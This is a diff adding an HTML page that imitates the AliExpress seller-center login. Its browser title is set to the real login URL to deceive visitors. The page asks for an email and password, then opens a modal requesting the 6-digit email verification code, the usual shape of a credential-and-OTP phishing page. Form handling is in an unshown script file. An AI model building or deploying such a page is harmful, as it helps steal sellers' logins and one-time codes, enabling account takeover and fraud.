@@ -1,0 +1,113 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport"  content="width=device-width, initial-scale=1.0">
+    <link rel="icon" href="https://ae01.alicdn.com/kf/S319fd8b965e247a28c70363f8c91d7c9i.ico">
+    <link rel="stylesheet" href="./style.css">
+    <title>login.aliexpress.com/user/seller/login?bizSegment=GSP&spm=a2g0o.store</title>
+    <style>
+        /* Hide number input spinners for Chrome, Safari, Edge, and Opera */
+        input[type="number"]::-webkit-inner-spin-button,
+        input[type="number"]::-webkit-outer-spin-button {
+            -webkit-appearance: none;
+            margin: 0;
+        }
+
+        /* Hide spinners for Firefox */
+        input[type="number"] {
+            -moz-appearance: textfield;
+        }
+    </style>
+</head>
+<body>
+    <header>
+        <div class="nav">
+            <a href="https://www.aliexpress.com"><img src="./assets/Aliexpress_logo_PNG2.png" alt="Aliexpress Logo"></a>
+            <h3>Seller center</h3>
+            <div class="language">
+                <select id="language-select" onchange="changeLanguage()">
+                    <option value="en">Language</option>
+                    <option value="zh">中文 (Chinese)</option>
+                    <option value="de">Deutsch (German)</option>
+                    <option value="pl">Polski (Polish)</option>
+                    <option value="ja">日本語 (Japanese)</option>
+                    <option value="ru">Русский (Russian)</option>
+                    <option value="es">Español (Spanish)</option>
+                    <option value="it">Italiano (Italian)</option>
+                    <option value="tr">Türkçe (Turkish)</option>
+                    <option value="fr">Français (French)</option>
+                    <option value="pt">Português (Portuguese)</option>
+                </select>
+                <div class="icon"><img src="./assets/down-arrow.png" alt="" height="10px"></div>
+            </div>
+        </div>
+
+    </header>
+
+    <section class="main">
+        <div class="pl-login" style="margin-bottom: 100px;">
+            <p style="color: #222; font-size: 14px; font-weight: 700;">Please login using the AliExpress seller account(do not use buyer account)</p>
+            <p style="color: #999; font-size: 12px; font-weight: 400;">No account yet? <a href="https://login.aliexpress.com/join/seller/globalJoin.htm?spm=a2g0s.buyerloginandregister.0.0.3c4e55a3WY8E4A&_regFrom=AE_MAINLAND&_locale=en_US" style="color: #1d00d3; font-size: 12px; font-weight: 400; text-decoration: none;">Join now for free</a></p>
+               
+            <div class="login-form">
+                <!-- Email field with validation message -->
+                <div class="fields" id="emailMsg">
+                    <input type="email" id="email" placeholder="Email" required>
+                    <img src="./assets/cancel.svg" alt="Clear" id="clearEmail" class="clear-icon hidden" height="20px">
+                </div>
+                <p id="emailError" class="error-message hidden">Incorrect Email/Invalid Email</p>
+
+                <!-- Password field with show/hide functionality -->
+                <div class="fields" id="passwordMsg">
+                    <input type="password" id="password" placeholder="Password" required>
+                    <span style="display: flex; align-items: center; gap: 2px;">
+                    <img src="./assets/cancel.svg" alt="Clear" id="clearPassword" class="clear-icon hidden" height="20px"> 
+                    <img src="./assets/eye.png" alt="Toggle Password" id="togglePasswordHidden" class="icon hidden" height="20px">
+                    <img src="./assets/eye-hide.png" alt="Toggle Password" id="togglePassword"  height="20px">
+                    </span>
+                    
+                </div>
+                <p style="color: #27f; font-size: 15px; font-weight: 400;">Forgot password?</p>
+                <p id="passwordError" class="error-message hidden">Incorrect Password/Invalid Password</p>
+
+                
+                <!-- Button with loading state -->
+                <button id="submitButton" class="disabled" style="width: 370px;">Sign in</button>
+            </div>
+           
+        </div>
+
+
+
+    </section>
+
+    <footer>
+        <p>© 2010-2019 AliExpress.com. All rights reserved.</p>
+    </footer>
+
+    
+    <div id="otpModal" class="modal hidden">
+        <div class="modal-content">
+            <h2 style="font-size: 23px;">Email verification code</h2>
+            <p style="color:#999; font-size: 14px; font-weight: 400; margin: 18px 0;">Enter the 6-digit code we emailed to <br><span id="emailPlaceholder"></span></p>
+            <div class="otp-inputs">
+                <input type="number" maxlength="1" class="otp-field" />
+                <input type="number" maxlength="1" class="otp-field" />
+                <input type="number" maxlength="1" class="otp-field" />
+                <input type="number" maxlength="1" class="otp-field" />
+                <input type="number" maxlength="1" class="otp-field" />
+                <input type="number" maxlength="1" class="otp-field" />
+            </div>
+            <p id="countdownDisplay" style="color: #aaaaaa; font-size: 14px;"></p>
+            <div id="warningMessage" class="warning hidden">⚠️ Something went wrong. Try again.</div>
+            <button id="verifyButton" class="otpdisabled">Verify</button>
+            <a href="#" style="text-decoration: underline; color: #1f64fa; font-size: 14px; text-align: center; display: flex; justify-content: center; align-items: center; font-weight: 600;">Other ways to verify</a>
+            <p style="color: #aaaaaa; font-size: 12px; text-align: center; display: flex; justify-content: center; align-items: center; margin: 20px 0;">OTPs are usually delivered within 3 to 5 minutes.</p>
+        </div>
+    </div>
+
+    <script src="./script.js"></script>
+    <script src="./language.js"></script>
+</body>
+</html>
